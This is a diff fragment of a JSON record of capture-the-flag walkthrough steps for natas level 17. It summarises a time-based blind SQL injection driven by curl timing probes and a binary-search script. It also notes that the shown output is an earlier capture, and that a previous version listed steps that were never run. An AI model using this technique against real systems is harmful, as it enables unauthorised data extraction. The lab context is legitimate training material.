-     "text": "python3 /tmp/n17_3.py  (the script typed above; its output is the original capture - this host reached natas17 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+     ]
     }
-   ]
+   ],
+   "note": "natas L17 (client-side cast): the same boolean blind SQLi but the error text is suppressed - only TIMING differs (sleep(5) on a match). Two manual time probes (curl -w '%{time_total}') then n17blind.py (27L/1187B) drives the timing binary search: 'FINAL <password>'. DISCLOSURE: the previous JSON staged echo-wrapped probes + vim n17_3.py flows the cast never ran; tools/natas/l17/n17blind.py = the recording session's local file, exact marker match. JSON = 7 steps mirroring the cast 1:1."
   },
   {
    "lvl": 18,
